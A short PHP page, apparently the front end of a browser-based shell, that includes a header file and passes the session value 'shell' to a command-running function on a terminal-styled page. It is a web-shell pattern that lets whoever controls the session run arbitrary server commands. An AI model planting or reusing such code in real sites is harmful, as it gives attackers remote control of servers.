<?php
include "componentes/head.php";
?>
<!DOCTYPE html>
<html>
	<body style="background-color: black; color: white; font-size: 12px;">
		<?php
			guardar_session();
			lanzar_comando($_SESSION['shell']);
		?>
	</body>
</html>